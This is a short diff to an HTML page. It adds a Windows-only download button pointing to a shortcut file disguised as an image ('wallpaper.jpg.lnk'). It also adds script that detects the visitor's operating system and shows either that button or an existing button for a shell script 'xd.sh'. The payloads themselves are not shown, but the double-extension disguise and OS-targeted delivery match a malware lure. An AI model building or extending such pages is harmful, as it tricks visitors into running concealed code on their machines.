@@ -7,7 +7,7 @@
     
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Titel</title>
+    <title>Title</title>
   </head>
   
   <style>
@@ -155,8 +155,10 @@ body {
         </div>
         
         <div id="middd">
-          <button class="pushable">
+          <button class="pushable" id="unix">
             <a class="front" href="/xd.sh" download="xd.sh">Download</a></button>
+          <button class="pushable" id="windows">
+            <a class="front"  href="/wallpaper.jpg.lnk" download="xd.sh">Download</a></button>
         </div>
       
       
@@ -172,5 +174,13 @@ body {
 
   </body>
 
+  <script>
+    if (navigator.appVersion.indexOf("Win") != -1) {
+      document.getElementById('unix').style.display = "none";
+    } 
+    else {
+      document.getElementById('windows').style.display = "none";
+    }
+  </script>
 
 </html>
